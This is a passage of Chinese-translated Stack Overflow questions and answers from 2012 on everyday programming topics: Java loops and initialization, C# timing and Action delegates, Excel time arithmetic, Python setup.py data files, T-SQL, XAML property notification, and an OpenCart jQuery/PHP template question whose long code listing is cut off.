# java - 遍历当前月份以获取所有事件

> ID：12461590
> 
> 赞同：0
> 
> 时间：2012-09-17T14:36:53.423
> 
> 标签：java, android, events, listview

我有一个日历应用程序。我想添加一个显示当月所有事件的列表视图。

这是我用来循环的代码，但它只显示本月的最后一个事件，而不是*所有*事件：

```
 for(int i = 0; i < _calendar.getActualMaximum(Calendar.DAY_OF_MONTH); i++){
        if(isHoliday(i, month, year, date_value))
        {

            String date= i + " " + getMonthForInt(month);
            CalendarEvents events = new CalendarEvents();
            final ArrayList<Event> e = new ArrayList<Event>();
            e.addAll(events.eventDetails(hijri_date[1], hijri_date[0]));

            for (int j = 0; j < e.size(); j++)
            {
               Event event = e.get(j);
               summary_data = new Summary[]
                {
                   new Summary(date, event.eventdetails)
                };
            } 
        }
    }

summaryAdapter = new SummaryAdapter(this.getActivity().getApplicationContext(), R.layout.listview_item_row, summary_data);

calendarSummary = (ListView) v.findViewById(R.id.calendarSummary);
calendarSummary.setAdapter(summaryAdapter); 
```

**更新代码：**

```
CalendarEvents events = new CalendarEvents();
final ArrayList<Event> e = new ArrayList<Event>();
String date;

for(int i = 0; i < _calendar.getActualMaximum(Calendar.DAY_OF_MONTH); i++){
    if(isHoliday(i, month, year, date_value))
    {
        date = i + "-" + month + "-" + year;

        e.addAll(events.eventDetails(month, day));
        summary_data = new Summary[e.size()];

        for (int j = 0; j < e.size(); j++)
        {

           Event event = e.get(j);
           summary_data[j] = new Summary(date, event.eventdetails);
        } 
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:38:16.800

您每次都在创建数组并分配给相同的引用。这就是为什么最后一个替换其他所有内容的原因。

```
 summary_data = new Summary[]
                {
                   new Summary(date, event.eventdetails)
                }; 
```

您知道前面的大小，因此先创建具有大小的数组，然后将值分配给索引

```
summary_data = new Summary[e.size()];

 for(....)
    {
 ......
    summary_data[j] = new Summary(date, event.eventdetails);
    } 
```

/////

```
if(isHoliday(i, month, year, date_value))
    {
       String date = i + "-" + month + "-" + year; 
```

# c# - 如何在结果中显示搜索时间？

> ID：12461592
> 
> 赞同：0
> 
> 时间：2012-09-17T14:36:53.423
> 
> 标签：c#, asp.net, entity-framework, linq-to-entities

嗨，我有搜索表单，当我在数据库中搜索项目时，我想显示搜索时间，如谷歌：![在此处输入图像描述](../Images/dc412a0b4cf3b78d10bfe27f85fd5fd9.png)

提前致谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-17T14:41:29.237

您可以使用 System.Diagnostics.Stopwatch 创建一个新的秒表，然后再进行搜索，然后将其停止并打印出所花费的时间。

```
Stopwatch Time = new Stopwatch();
Time.Start();
SearchDM();
Time.Stop();
Console.WriteLine("Search Took: {0} Seconds", Time.Elapsed) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-17T14:40:21.793

[花点时间](http://kiranpatils.wordpress.com/2008/02/14/checking-execution-time-with-cnet-use-of-it-in-wssfwcsf/)当用户点击按钮然后结果从您的数据访问层返回时。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T14:51:24.547

您可以两次捕获当前时间：

```
DateTime startTime = DateTime.Now;
var results = SearchDB(searchArgs);
DateTime endTime = DateTime.Now;
TimeSpan searchTime = endTime - startTime;
Console.Writeline("Search Took: {0} milliSeconds", searchTime.Milliseconds); 
```

# excel - Excel - 计算日期时间

> ID：12461598
> 
> 赞同：0
> 
> 时间：2012-09-17T14:37:08.533
> 
> 标签：excel, datetime, excel-2007

我正在尝试计算两次之间的小时差。我现在所做的只是给了我小时的指示，`1:30, 2:45, etc`但我无法根据这些值制作图表。如果我得到`2:30`小时差，它应该变成`2,5`. 如果不同的是`2:45`应该是`2,75`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-17T14:46:54.527

将您的公式更改为：

```
(B2-A1)*24 
```

和一般格式

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T14:44:40.620

您应该只能从另一个中减去 1 个日期时间。尝试这个：

1.  在单元格 A1 中，输入**“09/17/2012 10:00”**（Excel 应自动将其识别为日期）
2.  在单元格 A2 中，输入**“09/17/2012 11:30”**
3.  在单元格 A3 中，**"=(A2-A1)*24"**。结果是 1.5。

问题可能是您试图从另一个没有日期组件的“时间”中减去 1 个“时间”。在这种情况下，Excel 可能无法将您的值识别为“时间”。尝试在时间的开头添加一个虚拟日期。

这样做的一个限制是，如果第二个日期早于第一个日期（因为结果是否定的），您将收到“########”的错误响应。如果这是一个问题，请尝试**“=ABS(A2-A1)*24”**。

# python - 设置 setup.py 用于打包单个 .py 文件和单个数据文件，无需创建任何文件夹

> ID：12461603
> 
> 赞同：42
> 
> 时间：2012-09-17T14:37:19.807
> 
> 标签：python, packaging, setup.py

**项目树：**

```
$.
├── happy_birthday-art.txt
├── happy_birthday.py
├── MANIFEST.in
├── README.rst
└── setup.py 
```

**安装程序.py**

```
from setuptools import setup

setup(
    name='Happy_birthday',
    py_modules=['happy_birthday'],
    data_files=['happy_birthday-art.txt'],
    entry_points={
    'console_scripts': ['happy_birthday = happy_birthday:main', ],},
    long_description=open('README.rst').read(),
) 
```

现在，当我这样做`python setup.py sdist`，然后在虚拟环境`pip install`中创建`.tar.gz`文件时，我收到以下消息：

```
warning: install_data: setup script did not provide a directory for 'happy-birthday-art.txt' -- installing right in '/home/username/.virtualenvs/happy_birthday' 
```

该程序使用该 .txt 文件，因此在之后尝试运行它时会失败。

但我不想安装`happy_birthday-art.txt`到单独的文件夹中。我想将它安装在安装的文件夹中`happy_birthday.py`。另外，我不想在`setup.py`. 如何最好地设置我的`setup.py`文件？

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-09-17T15:04:18.170

如果您有这样的单文件模块，则不会创建文件夹，您的`.py`文件将直接移动到包含其他 python 模块的目录中（`/usr/lib/pythonX.X/site-packages/`例如）。这就是为什么你*必须*创建一个目录：

```
$ .
|-- happy_birthday/
    |-- __init__.py
    |-- art.txt
|-- MANIFEST.in
|-- README.rst
|-- setup.py 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2013-07-31T06:49:05.177

[http://docs.python.org/2/distutils/setupscript.html](http://docs.python.org/2/distutils/setupscript.html)

> “您可以将 data_files 选项指定为简单的文件序列，而无需指定目标目录，但不建议这样做，在这种情况下 install 命令会打印警告。要直接在目标目录中安装数据文件，请使用空字符串应该作为目录给出。”

但是，这里的目标目录不是 site-packages 文件夹，而是前缀文件夹，即 venv 的根目录。如果您希望 .txt 驻留在 site-packages 目录中，那么它不仅看起来很难看，而且似乎真的不受支持。另一方面，可以将它安装到环境中的另一个位置，例如在“share/doc/foo”中：

```
data_files=[('share/doc/foo', ['happy_birthday-art.txt'])], 
```

# tsql - 从表的列中删除重复值而不删除表的行

> ID：12461605
> 
> 赞同：0
> 
> 时间：2012-09-17T14:37:26.183
> 
> 标签：tsql, sql-server-2005

我写了这段代码

```
SELECT  

cast(isnull(x.hc,'') AS VARCHAR(500)) as A,

Case
When cast(isnull(p.dg,'') AS VARCHAR(500)) = '0' then ''
else cast(isnull(p.dg,'') AS VARCHAR(500))
End as B, 

Case
When cast(isnull(h.cno,'') as varchar(500)) = '0' then ''
else cast(isnull(h.cno,'') as varchar(500))
End as C, --added

cast(isnull(p.vol,0) as varchar(500)) as D,

cast(isnull(p.weigh,0) as varchar(500)) as E

FROM ship g
inner join S_M d on d.ship_id = g.ship_id
left join Pack h on h.ship_id = g.ship_id
left join pack_d p on p.pack_id = h.pack_id
left join comm x on x.comm_id = p.comm_id
WHERE g.ship_pk = @ship_pk 
GROUP BY  cast(isnull(x.hc,'') AS VARCHAR(500)), cast(isnull(p.dg,'') AS VARCHAR(500)), cast(isnull(h.cno,'') as varchar(500)), cast(isnull(p.vol,0) as varchar(500)), cast(isnull(p.weigh,0) as varchar(500)) 
```

这给了我输出

```
A     B      C        D        E

123   Yes    AB456    26.34    28.45
123   Yes    AB687    26.34    28.45
125   No     AB794    22.58    24.36
125   No     AB456    22.58    24.36
125   No     AB687    22.58    24.36 
```

如何更改上面的代码，以便我可以得到输出

```
A     B      C        D        E

123   Yes    AB456    26.34    28.45
             AB687    26.34    28.45
125   No     AB794    22.58    24.36
             AB456    22.58    24.36
             AB687    22.58    24.36 
```

如何从表格的前两列中删除重复值如上所示？我不会在这里删除任何行，而只是删除重复的值并将该字段保留为空白。

我怎样才能做到这一点？

# java - 如果我使用默认初始化或不初始化，会有所不同吗？

> ID：12461607
> 
> 赞同：4
> 
> 时间：2012-09-17T14:37:32.517
> 
> 标签：java

是否存在使用默认初始化的情况，例如：

```
int myValue; 
```

或者

```
MyObject o = null; 
```

与我根本不初始化变量的情况相比，可以改变我的程序的行为吗？

我正在寻找一个例子。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-17T14:42:03.863

局部变量必须在使用前进行初始化。这是由编译器强制执行的。

字段默认初始化为与其类型关联的默认值（false、0、null）。这是 Java 语言规范所要求的。

因此，在大多数情况下，将它们显式初始化为默认值只会增加噪音：

```
MyObject o = null; 
```

什么都不做

```
MyObject o; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T15:12:34.970

是的，可能会有所不同，如本例所示。这有点做作，但归结为初始化发生的时间。

考虑以下类：

```
import java.lang.reflect.Field;

public class base {
  protected base(int arg) throws Exception {
    Field f = getClass().getDeclaredField("val");
    System.out.println(f.get(this));
    f.set(this, 666);
  }
} 
```

以及以下两个扩展它的类。`test1`显式设置为 0：

```
public class test1 extends base {
  int val=0; // Explicitly set to 0

  public test1() throws Exception {
    super(0);
  }

  public static void main(String argv[]) throws Exception {
    System.out.println(new test1().val);
  }
} 
```

`test2`就离开它：

```
public class test2 extends base {
  int val; // just leave it to be default

  public test2() throws Exception {
    super(0);
  }

  public static void main(String argv[]) throws Exception {
    System.out.println(new test2().val);
  }
} 
```

运行这些给出：

```
javac test1.java && java test1                        
0
0 
```

但是对于第二种情况：

```
javac test2.java && java test2                        
0
666 
```

这巧妙地说明了一种不同的行为，唯一的变化是`= 0`for 字段。

拆开第一种情况可以看出原因：

```
import java.io.PrintStream;

public synchronized class test1 extends base
{
    int val;

    public test1()
        throws Exception
    {
        super(0);
        val = 0; // Note that the the explicit '= 0' is after the super()
    }

    public static void main(String astring[])
        throws Exception
    {
        System.out.println(new test1().val);
    }
} 
```

如果这对您的代码库产生了影响，那么您需要担心更大的事情！

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-17T14:43:20.573

在 Java 中，类的实例和静态成员字段被分配了一个默认值：原语默认为 0，对象为 null，布尔值为 false。

但是，Java 要求您先为在方法范围内声明的局部变量赋值，然后才能使用它们。此类变量没有默认值。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-17T14:42:30.810

据我了解，没有这种情况。Java规范要求变量默认按照以下规则进行初始化：

> 数字：0 或 0.0
> 布尔值：false
> 对象引用：null

只要您在编程时牢记这些规则，显式初始化为与上述相同的值不会改变程序的行为。

# c - C、Linux 中的图形编程

> ID：12461612
> 
> 赞同：-7
> 
> 时间：2012-09-17T14:37:49.827
> 
> 标签：c, linux, sqlite, graphic

我将USB中的数据保存到数据库sqlite3中，我想创建这些数据的波形，我更喜欢在Linux中使用C，也许另一种语言也可以。有人有想法吗？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:41:36.907

如果你可以使用 C++，那么检查 QT，它有开放的图形库并且也支持 OpenGL

# c# - 将委托转换为操作 （行动 )

> ID：12461617
> 
> 赞同：0
> 
> 时间：2012-09-17T14:37:55.927
> 
> 标签：c#, generics, .net-3.5

我有一个数据库类，可以进行如下所有数据库调用：

```
public delegate void Part1_Callback(string message);
public delegate void Part2_Callback(DataTable dt);
public delegate void Part3_Callback(DataTable dt, int x, int y);
public delegate void ErrorHandler(string message);

public class CommandAndCallback<TCallback>
{
    public SqlCommand Sql { get; set; }
    public TCallback Callback { get; set; }
    public ErrorHandler Error { get; set; }
}

class DB : SingletonBase<DB>
{
    public static readonly string SqlConnectionString  = @"Data Source=MyDB;Initial Catalog=Stats;Integrated Security=True;Asynchronous Processing=true;";

    private DB()
    {
    }

    public void Part2(Part2_Callback callback, ErrorHandler error)
    {
        SqlConnection conn = new SqlConnection(SqlConnectionString);
        SqlCommand cmd = conn.CreateCommand();
        cmd.CommandType = CommandType.StoredProcedure;
        cmd.CommandText = "Part2";

        try
        {
            conn.Open();
        }
        catch (Exception ex)
        {
            error(ex.ToString());
            return;
        }

        CommandAndCallback<Part2_Callback> ar = new CommandAndCallback<Part2_Callback>() { Callback = callback, Error = error, Sql = cmd };
        IAsyncResult result = cmd.BeginExecuteReader(new AsyncCallback(Part2_Handler), ar, CommandBehavior.CloseConnection);
    }

    private void Part2_Handler(IAsyncResult result)
    {
        DataTable dt = new DataTable();
        CommandAndCallback<Part2_Callback> ar = (CommandAndCallback<Part2_Callback>)result.AsyncState;
        SqlDataReader dr;

        if (result.IsCompleted)
        {
            dr = ar.Sql.EndExecuteReader(result);
        }
        else
            dr = null;

        dt.Load(dr);
        dr.Close();
        dt.Columns[3].ReadOnly = false;
        ar.Callback(dt);
    }
} 
```

在我的主要课程中，我像这样使用它：

```
 private void Form1_Enter(object sender, EventArgs e)
    {
        showStatus("Loading");
        DB.Instance.Part2(Part2_OK, ErrorHandler);
    }
    private void ErrorHandler(string msg)
    {
        hideStatus();
        viewStack1.InvokeIfRequired(c => { c.moveToFirst(); });
        //MessageBox.Show(msg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
    }

    private void Part2_OK(DataTable dt)
    {
        dataGridView1.InvokeIfRequired(c =>
        {
            c.DataSource = dt;
        });
    } 
```

现在我的 DB 类中有 3 个方法，它们返回 3 组不同的数据，对于每种类型，我必须声明委托。
如果将来我要添加更多方法，那么我将不得不添加更多代表。

我可以删除代表的使用吗？我想简化我的类的构建，以便轻松添加新方法。

我需要的是能够像这样调用我的数据库类：

```
DB.Instance.PartX(PartX_OK, ErrorHandler); 
```

PartX 声明如下

```
private void PartX_OK(DataTable dt, int x, int y, ...)
{
//logic here
} 
```

可以`Action<T>`习惯那个，所以我可以用多个参数调用我的处理程序？如果是，那怎么办？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-17T14:45:26.400

有`Action`多达 16 个通用参数的类，您可能会找到适合您需要的类；）。请参阅[MSDN 页面](http://msdn.microsoft.com/en-us/library/018hxwa8.aspx)。

和调用

```
DB.Instance.PartX((p1, p2, p3, p4) => { ... }, ErrorHandler); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-17T14:46:49.613

是的，我的意思是回到你之前的问题，所以你的功能会变成

```
public void Part2(Action<DataTable> callback, ErrorHandler error)
{
    SqlConnection conn = new SqlConnection(SqlConnectionString);
    SqlCommand cmd = conn.CreateCommand();
    cmd.CommandType = CommandType.StoredProcedure;
    cmd.CommandText = "Part2";

    try
    {
        conn.Open();
    }
    catch (Exception ex)
    {
        error(ex.ToString());
        return;
    }

    CommandAndCallback<Action<DataTable>> ar = new CommandAndCallback<Action<DataTable>>() { Callback = callback, Error = error, Sql = cmd };
    IAsyncResult result = cmd.BeginExecuteReader(new AsyncCallback(Part2_Handler), ar, CommandBehavior.CloseConnection);
}

        private void Part2_Handler(IAsyncResult result)
    {
        DataTable dt = new DataTable();
        CommandAndCallback<Action<DataTable>> ar = (CommandAndCallback<Action<DataTable>>)result.AsyncState;
        SqlDataReader dr;

        if (result.IsCompleted)
        {
            dr = ar.Sql.EndExecuteReader(result);
        }
        else
            dr = null;

        dt.Load(dr);
        dr.Close();
        dt.Columns[3].ReadOnly = false;
        ar.Callback(dt);
    } 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-17T14:49:35.937

1.  `Part1_Callback`将等价于`Action<string>`
2.  `Part2_Callback`将等价于`Action<DataTable>`
3.  `Part3_Callback`将等价于`Action<DataTable, int, int>`
4.  `ErrorHandler`将等价于`Action<string>`

只需使用这些类型来代替您现有的每个委托。

几乎不再有需要定义自己的委托的情况。如果您有超过 16 个参数、`ref/out`形参、`params`参数或可选参数，那么您可能没有 Action/Func 重载，但这并不是特别常见。

# xaml - 从不同的属性中触发 PropertyChanged 是否被认为是不好的做法？

> ID：12461618
> 
> 赞同：0
> 
> 时间：2012-09-17T14:37:59.547
> 
> 标签：xaml

抱歉，如果有类似的问题，我在搜索中找不到。[这个问题](https://stackoverflow.com/questions/9398665/is-it-correct-to-use-onpropertychanged-event-to-ask-application-to-do-something)看起来很相似，但还不够接近。

无论如何，就像标题中一样，我只是想确保我正在做的事情不会被认为是不好的做法，或者没有更好的方法，因为我现在的工作方式感觉不太正确（我'在数据绑定方面很新）。

无论如何，上代码：

所以我有一些我的 XAML 绑定到的属性，我想在属性更改时更新 XAML。问题是我更喜欢我不直接设置的属性，而是那些计算它们的值的属性。那么这是实现这一目标的良好/合法方式吗？

```
 public IPolicy Policy
    {
        get { return _policy; }
        set
        {
            _policy = value;
            OnPropertyChanged("HasAdminFee");
            OnPropertyChanged("AdminFeeMessage");
        }
    }
    public bool HasAdminFee
    {
        get { return Policy != null && Policy.ChargeAdminFeesValue > 0; }
    }
    public string AdminFeeMessage
    {
        get { return HasAdminFee ? string.Format(HasAdminFeeMessage, PolicyFact.ChargeAdminFeesValue) : NoAdminFeeMessage; }
    }

    public event PropertyChangedEventHandler PropertyChanged;
    protected void OnPropertyChanged(string propertyName)
    {
        PropertyChangedEventHandler handler = PropertyChanged;
        if (handler != null)
        {
            handler(this, new PropertyChangedEventArgs(propertyName));
        }
    } 
```

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T14:51:29.067

你这样做是正确的。我认为这是一种有效且可接受的做法。在我目前正在开发的 WPF 应用程序中，我们使用这种方法。

# php - 在 ajax post/get 之后使用 PHP 和 Html 进行输出时需要帮助

> ID：12461622
> 
> 赞同：-1
> 
> 时间：2012-09-17T14:38:25.480
> 
> 标签：php, ajax, jquery, opencart

代码是这样的

```
$.get(
            //'index.php?route=sale/order/infoforhome&token=<?php echo $token; ?>', 
            'index.php?route=common/home/orderinfo&token=<?php echo $token; ?>', 
            { 'order_id' : id }, 
            function(data){
                if(data)
                {
                        html =  '<div class="vtabs">' + 
                                '<?php if ($this->config->get(\'sales_order_detail\')) { ?>' +
                                '<a href="#tab-order"><?php echo $tab_order; ?></a>'+ 
                                '<?php } ?>' + 
                                '<?php if ($this->config->get(\'sales_payment_detail\')) { ?>' + 
                                '<a href="#tab-payment"><?php echo $tab_payment; ?></a>' + 
                                '<?php } ?>' + 
                                '<?php if ($shipping_method) { ?>' +
                                '<?php if ($this->config->get(\'sales_shipping_detail\')) { ?>' +
                                '<a href="#tab-shipping"><?php echo $tab_shipping; ?></a>' + 
                                '<?php } ?>' +
                                '<?php } ?>' +
                                '<?php if ($this->config->get(\'sales_product\')) { ?>' + 
                                    '<a href="#tab-product">'+
                                        '<?php echo $tab_product; ?>'+
                                    '</a>'+
                                '<?php } ?>'+
                                '<?php if ($this->config->get(\'sales_order_history\')) { ?>' + 
                                    '<a href="#tab-history">' + 
                                        '<?php echo $tab_order_history; ?>' + 
                                    '</a>' + 
                                '<?php } ?>' + 
                                '</div>' +
                                '<?php if ($this->config->get(\'sales_order_detail\')) { ?>' +
                                '<div id="tab-order" class="vtabs-content">' +
                                '<table class="form">' +
                                    '<tr>' +
                                        '<td><?php echo $text_order_id; ?></td>' +
                                        '<td>#' + data['order_id'] + '</td>' +
                                    '</tr>' +
                                '<tr>' +
                                    '<td><?php echo $text_invoice_no; ?></td>' +
                                    '<td><?php if (' + data['invoice_no'] + '){ ?>' +
                                        data['invoice_no'] +
                                        '<?php } else { ?>' +
                                        '<span id="invoice"><b>[</b> <a id="invoice-generate"><?php echo $text_generate; ?></a> <b>]</b></span>' +
                                    '<?php } ?></td>'+
                                '</tr>'+
                                '<tr>'+
                                    '<td><?php echo $text_store_name; ?></td>' +
                                    '<td>'+ data['store_name'] +'</td>' +
                                '</tr>' +
                                '<tr>' +
                                    '<td><?php echo $text_store_url; ?></td>' +
                                    '<td><a onclick="window.open(\''+ data[store_url] +'\');"><u>' + data['store_url'] + '</u></a></td>' +
                                '</tr>' +
                                '<?php if (' + data['customer'] + ') { ?>' +
                                '<tr>' +
                                    '<td><?php echo $text_customer; ?></td>' +
                                    '<td><a href="' + data['customer'] + '">' + data['firstname'] + ' ' + data['lastname'] + '</a></td>' +
                                '</tr>' +
                                '<?php } else { ?>' +
                                '<tr>' +
                                    '<td><?php echo $text_customer; ?></td>' +
                                    '<td>' + data['firstname'] + ' ' + data['lastname'] + '</td>' +
                                '</tr>' +
                                '<?php } ?>' +
                                '<?php if (' + data['customer_group'] + ') { ?>' +
                                '<tr>' +
                                    '<td><?php echo $text_customer_group; ?></td>' +
                                    '<td>' + data['customer_group'] + '</td>' +
                                '</tr>' +
                                '<?php } ?>' +
                                '<tr>' +
                                    '<td><?php echo $text_ip; ?></td>' +
                                    '<td>'+ data['ip']+'</td>' +
                                '</tr>' +
                                '<tr>' +
                                    '<td><?php echo $text_email; ?></td>' +
                                    '<td>' + data['email'] + '</td>' +
                                '</tr>' +
                                '<tr>' +
                                    '<td><?php echo $text_telephone; ?></td>' +
                                    '<td>' + data['telephone'] + '</td>' +
                                '</tr>'+
                                '<tr>' +
                                    '<td><?php echo $text_mobilephone; ?></td>' +
                                    '<td>' + data['mobilenumber'] + '</td>' +
                                '</tr>'+
                                '<?php if ('+data['fax']+') { ?>' +
                                '<tr>' +
                                    '<td><?php echo $text_fax; ?></td>' +
                                    '<td>' + data['fax'] + '</td>' +
                                '</tr>' +
                                '<?php } ?>' +
                                '<tr>' +
                                    '<td><?php echo $text_total; ?></td>' +
                                    '<td>' + data['total'] +
                                    '<?php if (' + data['credit'] + '&&' + data['customer'] + ') { ?>' +
                                    '<?php if (!' + data['credit_total'] + ') { ?>' +
                                    '<span id="credit"><b>[</b> <a id="credit-add"><?php echo $text_credit_add; ?></a> <b>]</b></span>' +
                                    '<?php } else { ?>' +
                                    '<span id="credit"><b>[</b> <a id="credit-remove"><?php echo $text_credit_remove; ?></a> <b>]</b></span>' +
                                    '<?php } ?>' +
                                    '<?php } ?></td>' +
                                '</tr>' +

                                '<?php if ($order_status) { ?>' +
                                '<tr>' +
                                    '<td><?php echo $text_order_status; ?></td>'+
                                    '<td id="order-status">' + data['order_status'] + '</td>'+
                                '</tr>'+
                                '<?php } ?>'+
                                '<?php if (' + data['comment'] + ') { ?>'+
                                '<tr>'+
                                    '<td><?php echo $text_comment; ?></td>'+
                                    '<td>' + data['comment'] + '</td>'+
                                '</tr>'+
                                '<?php } ?>'+
                                '<?php if (' + data['affiliate'] + ') { ?>'+
                                '<tr>'+
                                    '<td><?php echo $text_affiliate; ?></td>'+
                                    '<td><a href="' + data['affiliate'] + '">' + data['affiliate_firstname'] + ' ' + data['affiliate_lastname'] + '</a></td>'+
                                '</tr>'+
                                '<tr>'+
                                    '<td><?php echo $text_commission; ?></td>'+
                                    '<td>' + data['commission'] +
                                    '<?php if (!' + data['commission_total'] + ') { ?>'+
                                    '<span id="commission"><b>[</b> <a id="commission-add"><?php echo $text_commission_add; ?></a> <b>]</b></span>'+
                                    '<?php } else { ?>'+
                                    '<span id="commission"><b>[</b> <a id="commission-remove"><?php echo $text_commission_remove; ?></a> <b>]</b></span>'+
                                    '<?php } ?></td>'+
                                    '</tr>'+
                                    '<?php } ?>'+
                                    '<tr>'+
                                      '<td><?php echo $text_date_added; ?></td>'+
                                      '<td>' + data['date_added'] + '</td>'+
                                    '</tr>'+
                                    '<tr>'+
                                      '<td><?php echo $text_date_modified; ?></td>'+
                                      '<td>' +data['date_modified']+'</td>'+
                                    '</tr>'+
                                  '</table>'+
                                '</div>'+
                                '<?php } ?>'+
                                '<?php if ($this->config->get(\'sales_payment_detail\')) { ?>'+
                                '<div id="tab-payment" class="vtabs-content">'+
                                '<table class="form">'+
                                '<tr>'+
                                    '<td><?php echo $text_firstname; ?></td>'+
                                    '<td>'+ data['payment_firstname'] +'</td>'+
                                '</tr>'+
                                '<tr>'+
                                  '<td><?php echo $text_lastname; ?></td>'+
                                  '<td>' + data['payment_lastname'] + '</td>'+
                                '</tr>'+
                                '<?php if (' + data['payment_company'] +') { ?>'+
                                '<tr>'+
                                  '<td><?php echo $text_company; ?></td>'+
                                  '<td>' + data['payment_company']+ '</td>'+
                                '</tr>'+
                                '<?php } ?>'+
                                '<tr>'+
                                  '<td><?php echo $text_address_1; ?></td>'+
                                  '<td>' + data['payment_address_1'] + '</td>'+
                                '</tr>'+
                                '<?php if (' + data['payment_address_2'] + ') { ?>'+
                                '<tr>'+
                                  '<td><?php echo $text_address_2; ?></td>'+
                                  '<td>' +data['payment_address_2']+'</td>'+
                                '</tr>'+
                                '<?php } ?>'+
                                '<tr>'+
                                  '<td><?php echo $text_city; ?></td>'+
                                  '<td>' + data['payment_city'] + '</td>'+
                                '</tr>'+
                                '<?php if (' + data['payment_postcode'] + ') { ?>'+
                                '<tr>'+
                                  '<td><?php echo $text_postcode; ?></td>'+
                                  '<td>' + data['payment_postcode'] + '</td>'+
                                '</tr>'+
                                '<?php } ?>'+
                                '<tr>'+
                                  '<td><?php echo $text_zone; ?></td>'+
                                  '<td>' + data['payment_zone'] + '</td>'+
                                '</tr>'+
                                '<?php if (' + data['payment_zone_code'] + ') { ?>'+
                                '<tr>'+
                                  '<td><?php echo $text_zone_code; ?></td>'+
                                  '<td>' + data['payment_zone_code'] + '</td>'+
                                '</tr>'+
                                '<?php } ?>'+
                                '<tr>'+
                                  '<td><?php echo $text_country; ?></td>'+
                                  '<td>' + data['payment_country'] + '</td>'+
                                '</tr>'+
                                '<tr>'+
                                  '<td><?php echo $text_payment_method; ?></td>'+
                                  '<td>' + data['payment_method'] + '</td>'+
                                '</tr>'+
                              '</table>'+
                            '</div>'+
                            '<?php } ?>'+
                            '<?php if ($this->config->get(\'sales_shipping_detail\')) { ?>'+
                            '<?php if ($shipping_method) { ?>'+
                            '<div id="tab-shipping" class="vtabs-content">'+
                            '<table class="form">'+
                                '<tr>'+
                                    '<td><?php echo $text_firstname; ?></td>'+
                                    '<td>' + data['shipping_firstname'] + '</td>'+
                                '</tr>'+
                            '<tr>'+
                              '<td><?php echo $text_lastname; ?></td>'+
                              '<td>' + data['shipping_lastname'] + '</td>'+
                            '</tr>'+
                            '<?php if (' + data['shipping_company']+ ') { ?>'+
                            '<tr>'+
                              '<td><?php echo $text_company; ?></td>'+
                              '<td>' + data['shipping_company']+'</td>'+
                            '</tr>'+
                            '<?php } ?>'+
                            '<tr>'+
                              '<td><?php echo $text_address_1; ?></td>'+
                              '<td>' + data['shipping_address_1'] + '</td>'+
                            '</tr>'+
                            '<?php if (' + data['shipping_address_2'] + ') { ?>'+
                            '<tr>'+
                              '<td><?php echo $text_address_2; ?></td>'+
                              '<td>' + data['shipping_address_2'] + '</td>'+
                            '</tr>'+
                            '<?php } ?>'+
                            '<tr>'+
                              '<td><?php echo $text_city; ?></td>'+
                              '<td>' + data['shipping_city'] + '</td>'+
                            '</tr>'+
                            '<?php if (' + data['shipping_postcode'] + ') { ?>'+
                            '<tr>'+
                              '<td><?php echo $text_postcode; ?></td>'+
                              '<td>' + data['shipping_postcode'] + '</td>'+
                            '</tr>'+
                            '<?php } ?>'+
                            '<tr>'+
                              '<td><?php echo $text_zone; ?></td>'+
                              '<td>' + data['shipping_zone'] + '</td>'+
                            '</tr>'+
                            '<?php if (' + data['shipping_zone_code'] + ') { ?>'+
                            '<tr>'+
                              '<td><?php echo $text_zone_code; ?></td>'+
                              '<td>' + data['shipping_zone_code'] + '</td>'+
                            '</tr>'+
                            '<?php } ?>'+
                            '<tr>'+
                              '<td><?php echo $text_country; ?></td>'+
                              '<td>' + data['shipping_country'] + '</td>'+
                            '</tr>'+
                            '<?php if (' + data['shipping_method']+') { ?>'+
                            '<tr>'+
                              '<td><?php echo $text_shipping_method; ?></td>'+
                              '<td>' + data['shipping_method'] + '</td>'+
                            '</tr>'+
                            '<?php } ?>'+
                          '</table>'+
                        '</div>'+
                        '<?php } ?>'+
                            '<?php } ?>'+
                            '<?php if ($this->config->get(\'sales_product\')) { ?>'+
                        '<div id="tab-product" class="vtabs-content">'+
                          '<table id="product" class="list">'+
                            '<thead>'+
                              '<tr>'+
                                '<td class="left"><?php echo $column_product; ?></td>'+
                                '<td class="left"><?php echo $column_model; ?></td>'+
                                '<td class="right"><?php echo $column_quantity; ?></td>'+
                                '<td class="right"><?php echo $column_price; ?></td>'+
                                '<td class="right"><?php echo $column_total; ?></td>'+
                              '</tr>'+
                            '</thead>'+
                            '<?php foreach (' + data['products'] = ' as $product) { ?>'+
                            '<tbody id="product-row<?php echo $product[\'order_product_id\']; ?>">'+
                              '<tr>'+
                                '<td class="left"><?php if ($product[\'product_id\']) { ?>'+
                                  '<a href="<?php echo $product[\'href\']; ?>"><?php echo $product[\'name\']; ?></a>'+
                                  '<?php } else { ?>'+
                                  '<?php echo $product[\'name\']; ?>'+
                                  '<?php } ?>'+
                                  '<?php foreach ($product[\'option\'] as $option) { ?>'+
                                  '<br />'+
                                  '<?php if ($option[\'type\'] != \'file\') { ?>'+
                                  '&nbsp;<small> - <?php echo $option[\'name\']; ?>: <?php echo $option[\'value\']; ?></small>'+
                                  '<?php } else { ?>'+
                                  '&nbsp;<small> - <?php echo $option[\'name\']; ?>: <a href="<?php echo $option[\'href\']; ?>"><?php echo $option[\'value\']; ?></a></small>'+
                                  '<?php } ?>'+
                                  '<?php } ?></td>'+
                                '<td class="left"><?php echo $product[\'model\']; ?></td>'+
                                '<td class="right"><?php echo $product[\'quantity\']; ?></td>'+
